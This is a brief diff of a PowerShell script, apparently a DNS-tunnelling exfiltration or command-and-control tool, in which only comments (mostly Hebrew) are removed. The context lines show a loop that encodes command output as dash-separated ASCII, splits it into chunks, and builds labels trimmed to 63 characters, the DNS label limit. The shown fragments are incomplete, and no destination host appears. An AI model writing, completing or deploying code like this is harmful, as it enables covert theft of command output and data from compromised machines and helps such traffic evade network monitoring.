@@ -21,7 +21,7 @@ function Convert-ToFragmentedAscii {
     param (
         [string]$text
     )
-    # ממיר טקסט לרצף מספרי ASCII מופרד במקפים
+    
     $asciiArray = $text.ToCharArray() | ForEach-Object { [int][char]$_ }
     return ($asciiArray -join "-")
 }
@@ -43,7 +43,7 @@ while ($true) {
             $uniqueId = (Get-Date).ToString("yyyyMMddHHmmss")
             $fragmentedAscii = Convert-ToFragmentedAscii "$uniqueId|$commandOutput"
 
-            # חלק את המחרוזת המפוצלת למקטעים של עד 40 תווים
+            
             $chunks = $fragmentedAscii -split "(.{1,40})" | Where-Object { $_ -ne "" }
             $chunkCount = $chunks.Count
 
@@ -59,7 +59,7 @@ foreach ($chunk in $chunks) {
     $label = "$uniqueId-chunk$chunkIndex-$chunk"
     
     if ($label.Length -gt 63) {
-        $chunk = $chunk.Substring(0, 63 - ($uniqueId.Length + 7))  # Trim if label exceeds 63 characters
+        $chunk = $chunk.Substring(0, 63 - ($uniqueId.Length + 7)) 
         $label = "$uniqueId-chunk$chunkIndex-$chunk"
     }
     
